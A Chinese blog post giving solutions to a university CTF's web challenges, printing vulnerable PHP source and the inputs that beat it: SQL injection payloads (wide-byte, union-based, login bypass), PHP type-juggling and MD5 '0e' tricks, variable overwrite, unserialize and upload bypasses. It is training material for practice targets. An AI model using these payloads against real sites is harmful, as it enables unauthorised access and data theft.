title: 南京邮电大学ctf的web题
author: Qianye
abbrlink: dc43a318
tags:
  - ctf
categories:
  - ctf
date: 2018-02-28 20:40:00
---
以前做过了，再做一下，大部分都是挺简单的。 
<!-- more -->


# md5 collision

```bash
md5(!1793422703!,32) = 0e332932043729729062996282883873
md5(QNKCDZO,32) = 0e830400451993494058024219903391
md5(240610708,32) = 0e462097431906509019562988736854
```
上面三个加密后的MD5值是相等的，构造 
```bash
？a=240610708
```
# 层层递进
进入跳转的链接，fn+f12打开控制台，在网络项发现一个404页面，进入后，查看源码，仔细观察下面的js链接，flag.
```bash
<!--  
<script src="./js/jquery-n.7.2.min.js"></script>
<script src="./js/jquery-c.7.2.min.js"></script>
<script src="./js/jquery-t.7.2.min.js"></script>
<script src="./js/jquery-f.7.2.min.js"></script>
<script src="./js/jquery-{.7.2.min.js"></script>
<script src="./js/jquery-t.7.2.min.js"></script>
<script src="./js/jquery-h.7.2.min.js"></script>
<script src="./js/jquery-i.7.2.min.js"></script>
<script src="./js/jquery-s.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-i.7.2.min.js"></script>
<script src="./js/jquery-s.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-a.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-f.7.2.min.js"></script>
<script src="./js/jquery-l.7.2.min.js"></script>
<script src="./js/jquery-4.7.2.min.js"></script>
<script src="./js/jquery-g.7.2.min.js"></script>
<script src="./js/jquery-}.7.2.min.js"></script>
-->
```

# AAencode
一开始，一直在控制台上运行，一直未成功，仔细看一下，显示 ωﾟﾉ 为定义，定义：var ωﾟﾉ = " " 加上编码。
# 你从哪里来

按理说修改，
```bash
Referer:http://www.google.com 
```
就行，可是一直不成功，作罢。
# Download~!
两首歌，的下载地址都是
```bash
download.php?url=歌名.mp3的base64。
```
猜测flag也是在要这样下载才能出来。不知道flag的文件名是什么。猜了很久没有成功。看别人的答案：才知道，首先下载文件名为download.php得到源码，发现有keyishere.php的文件，用两首歌下载链接的规律base64加密文件名，构造链接访问，即可得到flag。

# sql injection 3

看链接地址，就猜测到时宽字节注入。这道题有两个flag，在ctf2表中的flag是错误的，ctf4表中的flag才是正确的。
得到字段数
一开始注释符号，直接用#，失败，页面一直报错，后来用%23，才行
```bash
id = %df' union select 1,database() %23
``` 
猜解表名
```bash
id=%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 
```
猜解字段名
```bash
id=%df' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746632 %23
```
得到记录值
```bash
id=%df' union select 1,group_concat(id,0x3a,flag) from ctf4 %23
```
# /x00
```bash
view-source:
    if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }
```
构造
```bash
?nctf[]
```
[解法原理](http://blog.csdn.net/sbhackerwing/article/details/63032439)
# bypass again
```bash
if (isset($_GET['a']) and isset($_GET['b'])) {
if ($_GET['a'] != $_GET['b'])
if (md5($_GET['a']) == md5($_GET['b']))
die('Flag: '.$flag);
else
print 'Wrong.';
}
```
构造payload
```bash
?a[]=1&b[]=2
```
或者
```bash
?a=QNKCDZO&b=240610708
```
# 变量覆盖
```bash
<?php
include("secret.php");
?>
<?php if ($_SERVER["REQUEST_METHOD"] == "POST") { ?>
                        <?php
                        extract($_POST);
                        if ($pass == $thepassword_123) { ?>
                            <div class="alert alert-success">
                                <code><?php echo $theflag; ?></code>
                            </div>
                        <?php } ?>
                    <?php } ?>
```
直接构造
```bahs
pass=1&thepassword_123=1
```
#php是世界上最好的语言 

```bash
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
```
url编码，传输过去默认会解码一次，所以我们不能只加密一次,将hackerDJ进行url加密两次，构造
```bash
id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41
```
[ereg和eregi](http://blog.csdn.net/shaobingj126/article/details/6861646)
# 上传绕过

上传的位置为dir+文件名，在dir写xx.php%00(%00进行urldecode),文件名那里为.jpg符合的后缀名。即可绕过
# sql注入1
```bash
<?php
if($_POST[user] && $_POST[pass]) {
    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = trim($_POST[user]);
  $pass = md5(trim($_POST[pass]));
  $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";
    echo '</br>'.$sql;
  $query = mysql_fetch_array(mysql_query($sql));
  if($query[user]=="admin") {
      echo "<p>Logged in! flag:******************** </p>";
  }
  if($query[user] != "admin") {
    echo("<p>You are not admin!</p>");
  }
}
echo $query[user];
?>
```
由源码一直用户名填写 admin')# 密码随便填，即可绕过
# pass check
```bash
<?php
$pass=@$_POST['pass'];
$pass1=***********;//被隐藏起来的密码
if(isset($pass))
{
if(@!strcmp($pass,$pass1)){
echo "flag:nctf{*}";
}else{
echo "the pass is wrong!";
}
}else{
echo "please input pass!";
}
?>
```
构造post请求 pass[]
# 起个名字真难
```bash
<?php
 function noother_says_correct($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {   
                $digit = ord($number{$i});
                if ( ($digit >= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '54975581388';
}
$flag='*******';
if(noother_says_correct($_GET['key']))
    echo $flag;
else 
    echo 'access denied';
?>
```
因为key的值不能出现字母，但是又必须等于`54975581388`所以只能转换成其他进制，发现十六进制的，刚好都是字母`0xccccccccc`。所以
构造 
```bash 
key=0xccccccccc
```

# 重置密码
进入链接后重置的是ctfuser的密码，发现url链接中user1=ctfuser的base64加密，直接点击重置试一下，显示错误。通过pb拦截数据包，将用户名改为admin,相关链接中的user1的值改为admin的base64加密的值。
# php反序列化

```bash
<?php
class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];

    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }

    $o = unserialize($pass);

    if ($o) {
        $o->secret = "*";
        if ($o->secret === $o->enter)
            echo "Congratulation! Here is my secret: ".$o->secret;
        else 
            echo "Oh no... You can't fool me";
    }
    else echo "are you trolling?";
}
?>
```
[序列化小科普](http://blog.csdn.net/21aspnet/article/details/6908318)
首先运行下面代码
```bash
<?php   
class just4fun {  
    var $enter;  
    var $secret;  
    function just4fun()  
    {  
        $this->enter=&$this->secret;  
    }  
}  
echo serialize(new just4fun());  
?> 
```
得到 `O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}`
构造 
```
？pass=O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}
```
# sql injection 4
```bash
#GOAL: login as admin,then get the flag;
error_reporting(0);
require 'db.inc.php';

function clean($str){
	if(get_magic_quotes_gpc()){
		$str=stripslashes($str);
	}
	return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
	die('Invalid password!');
}

echo $flag;
```
构造 ？username=\&password=or 1=1%23 
后台的查询语句为：
```bash
SELECT * FROM users WHERE name='\' AND pass=' or 1= 1#';
```
# 综合题
通过解密，知道有`1bc29b36f623ba82aaf6724fd3b16718.php`文件，访问，有提示说tip在我的脑袋，查看返回的头部请求，注意到tip:history of bash,百度可知其用法，访问 
```bash
http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history
```
得到flag的下载路径。
# sql注入2
```bash
<?php
if($_POST[user] && $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
      echo "<p>Logged in! Key: ntcf{**************} </p>";
  }
  else {
    echo("<p>Log in failure!</p>");
  }
}
?>

```
[解法](https://wenku.baidu.com/view/3f3e03c84431b90d6c85c7fb.html)
主要就是通过union 联合查询，将从数据库返回的值为空，自己构造数据库返回的值。

```bash
md5(2,32) = c81e728d9d4c2f636f067f89cc14862c
```
用户名输入
```
' and 1=0 UNION SELECT "c81e728d9d4c2f636f067f89cc14862c" #
```
密码中输入
```bash
2
```
# 综合题2

访问
`http://cms.nuptzj.cn/about.php?file=say.php`
````bash
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;?php
include 'config.php';
$nice=$_POST['nice'];
$say=$_POST['usersay'];
if(!isset($_COOKIE['username'])){
setcookie('username',$nice);
setcookie('userpass','');
}
$username=$_COOKIE['username'];
$userpass=$_COOKIE['userpass'];
if($nice==&quot;&quot; || $say==&quot;&quot;){
echo &quot;&lt;script&gt;alert('昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)');&lt;/script&gt;&quot;;
exit();
}
$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;不能连接到数据库！！&quot;.mysql_error());
mysql_select_db($db_name,$con);
$nice=mysql_real_escape_string($nice);
$username=mysql_real_escape_string($username);
$userpass=mysql_real_escape_string($userpass);
$result=mysql_query(&quot;SELECT username FROM admin where username='$nice'&quot;,$con);
$login=mysql_query(&quot;SELECT * FROM admin where username='$username' AND userpass='$userpass'&quot;,$con);
if(mysql_num_rows($result)&gt;0 &amp;&amp; mysql_num_rows($login)&lt;=0){
echo &quot;&lt;script&gt;alert('昵称已被使用，请更换！');&lt;/script&gt;&quot;;
mysql_free_result($login);
mysql_free_result($result);
mysql_close($con);
exit();
}
mysql_free_result($login);
mysql_free_result($result);
$say=mysql_real_escape_string($say);
mysql_query(&quot;insert into message (nice,say,display) values('$nice','$say',0)&quot;,$con);
mysql_close($con);
echo '&lt;script&gt;alert(&quot;构建和谐社会，留言需要经过管理员审核才可以显示！&quot;);window.location = &quot;./index.php&quot;&lt;/script&gt;';
?&gt;gt;
```